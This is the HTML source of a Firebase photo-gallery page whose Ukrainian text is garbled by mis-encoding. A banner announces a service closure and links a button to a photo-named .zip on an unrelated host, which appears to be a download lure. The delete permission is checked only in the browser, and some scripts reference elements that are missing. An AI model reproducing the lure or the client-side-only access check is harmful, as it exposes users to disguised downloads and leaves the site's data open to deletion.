<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ê—Ä—Ö—ñ–≤–Ω—ñ —Ñ–æ—Ç–æ –∑ –ø–æ–¥–æ—Ä–æ–∂—ñ</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
    }
    footer {
      background-color: #333;
      color: white;
      text-align: center;
      padding: 10px;
      bottom: 0;
      width: 100%;
    }
    img {
      max-width: 100%;
      height: auto;
      display: block;
      margin: 10px auto;
    }
    .chip-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 20px;
      padding: 20px;
    }
    .chip-button {
      display: inline-block;
      background: #333;
      color: #00ff99;
      padding: 15px 30px;
      font-size: 1em;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      text-decoration: none;
      border: 2px solid #00ff99;
      box-shadow: 0 0 10px rgba(0, 255, 153, 0.5);
      text-align: center;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      border-radius: 5px;
    }
    .chip-button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(0, 255, 153, 0.75);
    }
    #uploadForm {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      position: fixed;
      left: 50%;
      transform: translate(-50%, -100%); /* –ü–æ—á–∞—Ç–∫–æ–≤–∏–π —Å—Ç–∞–Ω (—Ñ–æ—Ä–º–∞ –≤–∏—ó–∂–¥–∂–∞—î –∑–≥–æ—Ä–∏) */
      z-index: 1000;
      opacity: 0;
      transition: transform 0.5s ease, opacity 0.5s ease; /* –ê–Ω—ñ–º–∞—Ü—ñ—è */
    }
    
    #loginForm {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      position: fixed;
      left: 50%;
      transform: translate(-50%, -100%); /* –ü–æ—á–∞—Ç–∫–æ–≤–∏–π —Å—Ç–∞–Ω (—Ñ–æ—Ä–º–∞ –≤–∏—ó–∂–¥–∂–∞—î –∑–≥–æ—Ä–∏) */
      z-index: 1000;
      opacity: 0;
      transition: transform 0.5s ease, opacity 0.5s ease; /* –ê–Ω—ñ–º–∞—Ü—ñ—è */
      }
    #loginForm.active {
      transform: translate(-50%, 0); /* –ü–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è –≤–Ω–∏–∑ –¥–æ —Ü–µ–Ω—Ç—Ä—É */
      opacity: 1; /* –ü–ª–∞–≤–Ω–∞ –ø–æ—è–≤–∞ */
    }
    #uploadForm.active {
      transform: translate(-50%, 0); /* –ü–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è –≤–Ω–∏–∑ –¥–æ —Ü–µ–Ω—Ç—Ä—É */
      opacity: 1; /* –ü–ª–∞–≤–Ω–∞ –ø–æ—è–≤–∞ */
    }
    #error-message {
      color: red;
    }
    .chip-grid img {
      position: relative;
    }
    .delete-button {
      background: rgba(0, 0, 0, 0.5);
      color: white;
      border: none;
      border-radius: 5px;
      padding: 5px 10px;
      cursor: pointer;
    }
    .delete-button:hover {
      background: rgba(255, 0, 0, 0.7);
    }
    #colorControls {
      margin: 20px;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
  </style>
</head>
<body>
<div class="chip-grid">
<p>üì¢ –í–∞–∂–ª–∏–≤–æ!
YFP –∑–∞–∫—Ä–∏—Ç–æ. –ü—É–±–ª—ñ–∫–∞—Ü—ñ—é –∞—Ä—Ö—ñ–≤–Ω–∏—Ö —Ñ–æ—Ç–æ —Ç–µ–ø–µ—Ä –∑–∞–º—ñ–Ω—é—é—Ç—å –¥–æ–ø–∏—Å–∏ —É VideoVortex.
–í–∏ –º–æ–∂–µ—Ç–µ —ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ —Å–≤–æ—ó –∞—Ä—Ö—ñ–≤–Ω—ñ —Ñ–æ—Ç–æ —Ç–∞ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –ø—É–±–ª—ñ–∫–∞—Ü—ñ—ó —É –Ω–æ–≤–æ–º—É —Å–µ—Ä–≤—ñ—Å—ñ.</p>
<button class="chip-button" href="292.inf.ua/–§–æ—Ç–æ –∑ –ë–µ—Ä–ª—ñ–Ω—É.zip"></button>
</div>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
  <script>
    // Firebase –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è
    const firebaseConfig = {
      apiKey: "AIzaSyCbk-8Z1msxjBkC-ystVwvXig26bsSHolE",
      authDomain: "photo-gallery-20dd5.firebaseapp.com",
      databaseURL: "https://photo-gallery-20dd5-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "photo-gallery-20dd5",
      storageBucket: "photo-gallery-20dd5.appspot.com",
      messagingSenderId: "565100326977",
      appId: "1:565100326977:web:c7c02d0082ee24b4ca56c0",
      measurementId: "G-H5QHS9YQK4"
    };

    // –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è Firebase
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();
    const auth = firebase.auth();

    // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Ñ–æ—Ä–º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å
    window.openUploadForm = function() {
      document.getElementById("uploadForm").classList.add("active");
    };
    window.closeUploadForm = function() {
      document.getElementById("uploadForm").classList.remove("active");
    };
    // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Ñ–æ—Ä–º–∏ –≤—Ö–æ–¥—É
    window.openLoginForm = function() {
      document.getElementById("loginForm").classList.add("active");
    };
    window.closeLoginForm = function() {
      document.getElementById("loginForm").classList.remove("active");
    };
    // –û–±—Ä–æ–±–∫–∞ —Ñ–æ—Ä–º–∏ –≤—Ö–æ–¥—É
    document.getElementById("loginFormElement").addEventListener("submit", function(event) {
      event.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const errorMessage = document.getElementById("error-message");

      auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
          const user = userCredential.user;
          document.getElementById("loginForm").style.display = "none";
          document.getElementById("openUploadForm").style.display = "block";
          errorMessage.innerHTML = '';
          loadImages(); // –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø—ñ—Å–ª—è –≤—Ö–æ–¥—É
        })
        .catch((error) => {
          errorMessage.innerHTML = '–ü–æ–º–∏–ª–∫–∞: ' + error.message;
        });
    });

    // –û–±—Ä–æ–±–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å
    document.getElementById("imageUploadForm").addEventListener("submit", function(event) {
      event.preventDefault();
      const file = document.getElementById("fileInput").files[0];
      const storageRef = storage.ref('images/' + file.name);
      
      storageRef.put(file).then(() => {
        alert('–ó–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ');
        document.getElementById("uploadForm").style.display = "none";
        loadImages();
      }).catch((error) => {
        alert('–ü–æ–º–∏–ª–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è: ' + error.message);
      });
    });

    // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å –∑ Firebase Storage
    function loadImages() {
      const storageRef = storage.ref().child('images/');
      const imagesContainer = document.getElementById("imagesContainer");
      imagesContainer.innerHTML = ''; // –û—á–∏—â–∞—î–º–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –ø–µ—Ä–µ–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º

      storageRef.listAll().then((result) => {
        result.items.forEach((imageRef) => {
          imageRef.getDownloadURL().then((url) => {
            // –°—Ç–≤–æ—Ä—é—î–º–æ –µ–ª–µ–º–µ–Ω—Ç –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è
            const imgElement = document.createElement("img");
            imgElement.src = url;

            // –î–æ–¥–∞—î–º–æ –∫–Ω–æ–ø–∫—É –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ç—ñ–ª—å–∫–∏ –¥–ª—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞
            const deleteButton = document.createElement("button");
            deleteButton.className = "delete-button";
            deleteButton.textContent = "–í–∏–¥–∞–ª–∏—Ç–∏";

            deleteButton.onclick = function() {
              if (auth.currentUser && auth.currentUser.email === "zhuzhun2008@gmail.com") {
                deleteImage(imageRef, imgElement);
              } else {
                alert("–í–∏–¥–∞–ª—è—Ç–∏ –º–æ–∂–µ –ª–∏—à–µ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä");
              }
            };

            // –î–æ–¥–∞—î–º–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Ç–∞ –∫–Ω–æ–ø–∫—É –≤–∏–¥–∞–ª–µ–Ω–Ω—è –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
            const imgContainer = document.createElement("div");
            imgContainer.appendChild(imgElement);
            if (auth.currentUser && auth.currentUser.email === "zhuzhun2008@gmail.com") {
              imgContainer.appendChild(deleteButton);
            }
            imagesContainer.appendChild(imgContainer);
          });
        });
      }).catch((error) => {
        console.log("–ü–æ–º–∏–ª–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å: ", error);
      });
    }

    // –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è
    function deleteImage(imageRef, imgElement) {
      imageRef.delete().then(() => {
        alert("–ó–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–∏–¥–∞–ª–µ–Ω–æ");
        imgElement.parentElement.remove();
      }).catch((error) => {
        console.log("–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è: ", error);
      });
    }

    // –í–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏

    // –ó–º—ñ–Ω–∞ –∫–æ–ª—å–æ—Ä—ñ–≤
    function changeBackgroundColor() {
      const color = document.getElementById("backgroundColor").value;
      document.body.style.backgroundColor = color;
      localStorage.setItem('backgroundColor', color); // –ó–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∫–æ–ª—å–æ—Ä—É —É localStorage
    }

    function resetColors() {
      document.body.style.backgroundColor = "#f4f4f4";
      localStorage.removeItem('backgroundColor'); // –í–∏–¥–∞–ª–µ–Ω–Ω—è –∫–æ–ª—å–æ—Ä—É –∑ localStorage
    }

    // –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ –∫–æ–ª—å–æ—Ä—É
    function loadSavedColors() {
      const savedColor = localStorage.getItem('backgroundColor');
      if (savedColor) {
        document.body.style.backgroundColor = savedColor;
        document.getElementById('backgroundColor').value = savedColor; // –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–Ω–∞—á–µ–Ω–Ω—è –≤ input
      }
    }

    // –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const blockedCountries = ["RU", "BY", "IR", "KP"]; // –°–ø–∏—Å–æ–∫ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–∏—Ö –∫—Ä–∞—ó–Ω
        if (blockedCountries.includes(data.country)) { // –Ø–∫—â–æ –∫—Ä–∞—ó–Ω–∞ –≤ —Å–ø–∏—Å–∫—É
          document.getElementById("colorControls").style.display = "none"; // –°—Ö–æ–≤–∞—Ç–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–ª—å–æ—Ä–æ–º
          document.body.style.backgroundColor = "#f4f4f4";
          localStorage.removeItem('backgroundColor');
        } else {
          document.getElementById("colorControls").style.display = "block"; // –ü–æ–∫–∞–∑–∞—Ç–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–ª—å–æ—Ä–æ–º
        }
      })
      .catch(error => {
        console.error("Error fetching geolocation data:", error);
      });
          window.onload = function() {
    loadSavedColors(); // –í–∞—à –∫–æ–¥ –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –∫–æ–ª—å–æ—Ä—ñ–≤
    loadImages()
          }
  </script>
</body>
</html>
